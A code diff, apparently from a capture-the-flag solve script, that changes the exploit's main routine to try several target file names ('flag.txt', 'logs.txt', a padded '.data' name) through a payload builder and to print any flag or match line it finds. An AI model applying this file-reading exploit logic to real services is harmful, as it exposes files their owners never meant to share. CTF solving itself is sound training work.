@@ -110,12 +110,26 @@ def extract_flag(out: bytes) -> Optional[str]:
 
 def main() -> None:
     base_idx = find_base_idx()
-    payload = build_payload(base_idx, b"flag.txt")
-    out = query(payload)
-    flag = extract_flag(out)
-    if not flag:
-        raise SystemExit(out.decode(errors="replace"))
-    print(flag)
+    candidates = [
+        b".data\x00\x00\x00",
+        b"flag.txt",
+        b"logs.txt",
+    ]
+    for name in candidates:
+        payload = build_payload(base_idx, name)
+        out = query(payload)
+        flag = extract_flag(out)
+        if flag:
+            print(flag)
+            return
+        # If file exists but doesn't contain flag, still surface a strong line
+        if b"Found match:" in out:
+            # print last match line for operator visibility
+            lines = [l for l in out.splitlines() if b"Found match:" in l]
+            if lines:
+                print(lines[-1].decode(errors="replace"))
+                return
+    raise SystemExit("no flag found")
 
 
 if __name__ == "__main__":
